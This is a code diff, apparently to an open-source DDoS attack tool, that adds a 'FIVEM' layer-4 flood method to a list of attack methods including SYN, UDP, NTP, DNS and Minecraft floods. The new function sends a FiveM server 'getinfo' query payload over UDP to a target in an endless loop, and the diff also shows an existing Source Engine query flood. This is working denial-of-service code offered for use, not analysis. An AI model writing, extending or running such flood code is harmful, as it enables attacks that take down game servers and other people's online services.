@@ -84,7 +84,7 @@ class Methods:
 
     LAYER4_METHODS: Set[str] = {
         "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MEM", "NTP", "DNS", "ARD",
-        "CHAR", "RDP", "MCBOT", "CONNECTION", "CPS"
+        "CHAR", "RDP", "MCBOT", "CONNECTION", "CPS", "FIVEM"
     }
     ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}
 
@@ -291,6 +291,7 @@ class Layer4(Thread):
         if name == "UDP": self.SENT_FLOOD = self.UDP
         if name == "SYN": self.SENT_FLOOD = self.SYN
         if name == "VSE": self.SENT_FLOOD = self.VSE
+        if name == "FIVEM": self.SENT_FLOOD = self.FIVEM
         if name == "MINECRAFT": self.SENT_FLOOD = self.MINECRAFT
         if name == "CPS": self.SENT_FLOOD = self.CPS
         if name == "CONNECTION": self.SENT_FLOOD = self.CONNECTION
@@ -412,6 +413,14 @@ class Layer4(Thread):
         global BYTES_SEND, REQUESTS_SENT
         payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                    b'\x20\x51\x75\x65\x72\x79\x00')
+        with socket(AF_INET, SOCK_DGRAM) as s:
+            while Tools.sendto(s, payload, self._target):
+                continue
+        Tools.safe_close(s)
+
+    def FIVEM(self) -> None:
+        global BYTES_SEND, REQUESTS_SENT
+        payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
         with socket(AF_INET, SOCK_DGRAM) as s:
             while Tools.sendto(s, payload, self._target):
                 continue
